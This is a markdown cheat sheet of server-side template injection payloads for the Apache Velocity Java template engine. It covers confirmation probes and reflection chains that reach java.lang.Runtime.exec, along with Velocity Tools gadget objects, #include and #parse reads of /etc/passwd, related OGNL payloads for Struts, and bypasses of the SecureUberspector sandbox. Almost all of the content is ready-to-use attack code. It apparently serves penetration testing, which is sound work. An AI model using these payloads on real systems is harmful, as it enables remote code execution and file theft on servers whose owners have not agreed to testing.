# Velocity — Java template engine (Apache)

Marker: `#set($x=7*7)${x}` → 49, or `${7*7}`/`#evaluate` shapes.
Velocity's `$var`/`#directive` syntax is distinct — no `{{}}`.

---

## 1. Confirm + context

```velocity
#set($x=7*7)${x}             → 49
${7*7}                        → 49 (some configs)
${x.getClass()}               -- class reachable?
$request                       -- request object if bound
$response
$context                       -- velocity context
$request.getSession()          -- session
$request.getSession().getAttribute('user')
$esc,$date,$math,$link,$field  -- standard tools if bound
```

Velocity silently renders unknown `$var` as literal `$var` — a
non-evaluating reference renders as typed, so probe with the
arithmetic first.

---

## 2. The reflection escape — class → Runtime

```velocity
#set($x=$x.getClass().forName("java.lang.Runtime"))
#set($rt=$x.getRuntime())
$rt.exec("id")
   -- classic chain — needs a reachable .class object

#set($x="")
#set($class=$x.class)
#set($runtime=$class.forName("java.lang.Runtime").getRuntime())
$runtime.exec("id")
```

The `$x.class` accessor — Velocity resolves `.class` as the
property. If a string/object is in scope (`$x=""` self-assigned!),
`.class` reaches reflection.

### Via `ClassTool`/existing beans

```velocity
$x.class.forName('java.lang.Runtime').getMethod('exec', $x.class.forName('java.lang.String')).invoke($x.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null), 'id')
   -- the full reflection chain for restricted paths
```

---

## 3. The `#evaluate`/`#parse`/`#include` directives

```velocity
#evaluate($payload)              -- re-evaluates a string as VTL —
                                  template-in-template execution!
#parse("/etc/passwd")            -- parse a file as VTL — the file
                                  gets EVALUATED (and error-leaks)
#include("/etc/passwd")          -- raw include — file content!
#macro / #define                  -- define blocks
```

`#include` is the file-read primitive — raw content into output.
`#parse` treats the file AS a template.

---

## 4. Velocity Tools — the gadget objects

```velocity
$esc.java                         -- EscapeTool
$math.random                      -- MathTool
$date.date                        -- DateTool
$link.uri('/x')                   -- LinkTool
$field.in('x')                    -- FieldTool — REFLECTION access!
$render                           -- RenderTool — evaluates VTL!
$class.inspect($x)                -- ClassTool — reflection!
$context.keys                     -- all context vars
$request,$response,$session,$application  -- servlet objects
```

`$class.inspect` and `$field` give reflection without `.class`
access — Velocity Tools are the gadget surface.

---

## 5. Struts2/OGNL adjacency — different engine, same family

```text
Apache Struts uses OGNL not Velocity — but both appear in Java
stacks. OGNL injection uses %{expr} or ${expr} — the Struts CVEs
(S2-xxx) are OGNL-eval in TAG ATTRIBUTES, not template injection.
```

If the marker `${7*7}` evaluates in a Struts app — could be OGNL:
`ognl.md`-style payloads: `%{7*7}`, `%{@java.lang.Runtime@getRuntime().exec('id')}`.

---

## 6. The test sequence

```velocity
#set($x=7*7)${x}                    -- confirm eval
$x.class                              -- reflection reach
$x.class.forName('java.lang.Runtime') -- forName path
$x.class.forName('java.lang.Runtime').getRuntime().exec('id')
$context.keys                          -- enumerate bound vars
$request                               -- servlet objects?
$class.inspect($x)                      -- ClassTool if bound
#include('/etc/passwd')                 -- file read
#parse('/etc/passwd')                   -- parse-file
```

---

## 7. The uberspect-blocked path

Modern Velocity configs install `SecureUberspector` blocking
`getClass`/`forName`/`exec`-named methods:

```velocity
$x.getClass()         -- blocked by SecureUberspector
$x.class               -- also blocked (same property path)
```

Bypasses: Velocity Tools reflection (`$class.inspect`), beans
bound into context that expose dangerous methods themselves,
`#include`/`#parse` for file-read, or `Runtime`-gadget beans
the app itself bound.
